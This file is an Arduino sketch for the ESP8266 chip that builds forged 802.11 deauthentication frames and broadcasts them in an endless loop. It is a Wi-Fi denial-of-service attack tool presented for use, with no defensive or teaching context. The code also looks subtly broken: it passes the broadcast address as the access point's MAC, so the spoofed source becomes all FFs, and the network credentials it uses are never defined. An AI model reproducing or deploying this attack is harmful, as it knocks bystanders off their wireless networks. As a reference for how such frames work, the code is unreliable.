#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
  #include "lwip/opt.h"
  #include "lwip/igmp.h"
  #include "ets_sys.h"
  #include "osapi.h"
  #include "user_interface.h"
  #include "espconn.h"
}

void setup() {
  Serial.begin(115200);
  Serial.println();
  Serial.println("Deauthing...");

  // Set WiFi to station mode and disconnect from any AP
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  WiFi.begin(HOST_SSID, HOST_PASSWORD);
  while (WiFi.status() != WL_CONNECTED){
    Serial.println(".");
    delay(1000);
  }

  // Broadcast deauth packets
  deauthAttack("FF:FF:FF:FF:FF:FF");  // FF:FF:FF:FF:FF:FF is the broadcast address
}

void loop() {
  // Do nothing here
}

void deauthAttack(const char* ap) {
  uint8_t packet[26] = {
    0xC0, 0x00, // Frame Control
    0x3A, 0x01, // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, // Source (AP MAC)
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, // BSSID (AP MAC)
    0x00, 0x00, // Fragment & Sequence number
    0x07, 0x00  // Reason code 7 (Class 3 frame received from nonassociated STA)
  };

  // Change source and BSSID to the AP's MAC address
  for (int i = 0; i < 6; i++) {
    packet[10 + i] = strtol(&ap[i * 3], NULL, 16);
    packet[16 + i] = strtol(&ap[i * 3], NULL, 16);
  }

  // Send the packet in a loop
  while (true) {
    wifi_send_pkt_freedom(packet, 26, 0);
    delay(1);
  }
}